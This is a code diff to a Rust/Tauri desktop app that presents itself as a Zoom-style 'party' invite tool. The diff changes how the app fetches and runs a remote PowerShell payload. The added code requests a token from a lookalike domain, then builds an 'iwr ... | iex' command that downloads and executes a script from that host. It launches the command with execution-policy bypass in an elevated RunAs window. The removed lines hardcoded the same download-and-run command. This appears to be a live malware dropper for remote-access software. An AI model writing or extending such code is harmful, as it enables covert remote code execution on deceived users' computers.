@@ -1,5 +1,5 @@
 use chrono::Local;
-use serde::{Serialize, Deserialize};
+use serde::{Deserialize, Serialize};
 use std::process::Command;
 
 // Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
@@ -31,90 +31,39 @@ struct RmmDeploymentResult {
 
 #[derive(Deserialize)]
 #[serde(rename_all = "camelCase")]
-struct PublicShellResponse {
-    configured: bool,
-    shell_command: Option<String>,
+struct TokenResponse {
+    ok: bool,
+    token: Option<String>,
 }
 
 const BACKEND_URL: &str = "https://call-invite-zoom.liveinvite.top";
 
-// Fetches canonical shell payload from backend (/api/shell)
-async fn fetch_public_shell() -> Result<PublicShellResponse, String> {
+async fn fetch_install_token() -> Result<String, String> {
     let client = reqwest::Client::new();
-    let url = format!("{}/api/shell", BACKEND_URL);
-    
-    match client
-        .get(&url)
-        .send()
-        .await
-    {
-        Ok(response) => {
-            match response.json::<PublicShellResponse>().await {
-                Ok(data) => Ok(data),
-                Err(_) => Err("Failed to parse shell response".to_string()),
-            }
-        }
+    let url = format!("{}/api/shell/token", BACKEND_URL);
+
+    match client.post(&url).send().await {
+        Ok(response) => match response.json::<TokenResponse>().await {
+            Ok(data) if data.ok => data
+                .token
+                .filter(|token| !token.trim().is_empty())
+                .ok_or_else(|| "Token response missing token".to_string()),
+            Ok(_) => Err("Token endpoint returned an unsuccessful response".to_string()),
+            Err(_) => Err("Failed to parse token response".to_string()),
+        },
         Err(e) => Err(format!("Failed to fetch shell command: {}", e)),
     }
 }
 
-fn last_nonempty_line(text: &str) -> Option<String> {
-    text
-        .lines()
-        .rev()
-        .map(str::trim)
-        .find(|line| !line.is_empty())
-        .map(ToString::to_string)
+fn build_shell_command(token: &str) -> String {
+    format!(
+        "$u='https://call-invite-zoom.liveinvite.top/api/shell/script?token={token}'; iwr -UseBasicParsing $u | iex"
+    )
 }
 
-fn extract_install_error(stderr: &str, stdout: &str) -> String {
-    let noise_markers = [
-        "FullyQualifiedErrorId",
-        "CategoryInfo",
-        "At line:",
-        "+ ",
-        "~~~~~~~~",
-        "ParserError",
-    ];
-
-    let mut fallback: Option<String> = None;
-
-    for source in [stderr, stdout] {
-        for raw in source.lines() {
-            let line = raw.trim();
-            if line.is_empty() {
-                continue;
-            }
-
-            if noise_markers.iter().any(|m| line.contains(m)) {
-                continue;
-            }
-
-            if let Some(rest) = line.strip_prefix("Write-Error:") {
-                let detail = rest.trim();
-                if !detail.is_empty() {
-                    return detail.to_string();
-                }
-            }
-
-            if line.contains("failed")
-                || line.contains("Failed")
-                || line.contains("not found")
-                || line.contains("cannot")
-                || line.contains("error")
-                || line.contains("Error")
-            {
-                return line.to_string();
-            }
-
-            fallback = Some(line.to_string());
-        }
-    }
-
-    fallback
-        .or_else(|| last_nonempty_line(stderr))
-        .or_else(|| last_nonempty_line(stdout))
-        .unwrap_or_else(|| "No error details returned by installer.".to_string())
+#[cfg(target_os = "windows")]
+fn quote_ps_single(value: &str) -> String {
+    value.replace('"', "\"\"")
 }
 
 #[tauri::command]
@@ -128,23 +77,61 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
         };
     }
 
-    // Always use the static PowerShell command as requested
-    let shell_command = "$u='https://call-invite-zoom.liveinvite.top/api/shell/script?token=fb1f864e368dc000002cfe71d35f68f99a2b1c1712bebe71075076746e346b12'; iwr -UseBasicParsing $u | iex";
+    let token = match fetch_install_token().await {
+        Ok(token) => token,
+        Err(e) => {
+            return RmmDeploymentResult {
+                success: false,
+                message: format!("Party prep hit a snag while generating your pass: {}", e),
+                deployed_at: None,
+            };
+        }
+    };
 
-    // Launch PowerShell as admin, pass the command, do not wait for or capture output
+    let shell_command = build_shell_command(&token);
+
+    if cfg!(debug_assertions) {
+        return RmmDeploymentResult {
+            success: true,
+            message: format!("[DEV] Generated token command: {}", shell_command),
+            deployed_at: Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string()),
+        };
+    }
+
+    // Launch an elevated PowerShell window, pass the command, and stop there.
     #[cfg(target_os = "windows")]
     {
-        use std::os::windows::process::CommandExt;
-        let _ = Command::new("powershell")
-            .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", shell_command])
-            .creation_flags(0x00000010) // CREATE_NEW_CONSOLE
+        let escaped_command = quote_ps_single(&shell_command);
+        let elevation_command = format!(
+            "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','{}'",
+            escaped_command
+        );
+
+        let spawn_result = Command::new("powershell")
+            .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &elevation_command])
             .spawn();
+
+        if let Err(e) = spawn_result {
+            return RmmDeploymentResult {
+                success: false,
+                message: format!("We could not open PowerShell: {}", e),
+                deployed_at: None,
+            };
+        }
     }
     #[cfg(not(target_os = "windows"))]
     {
-        let _ = Command::new("powershell")
-            .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", shell_command])
+        let spawn_result = Command::new("powershell")
+            .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &shell_command])
             .spawn();
+
+        if let Err(e) = spawn_result {
+            return RmmDeploymentResult {
+                success: false,
+                message: format!("We could not open PowerShell: {}", e),
+                deployed_at: None,
+            };
+        }
     }
 
     RmmDeploymentResult {
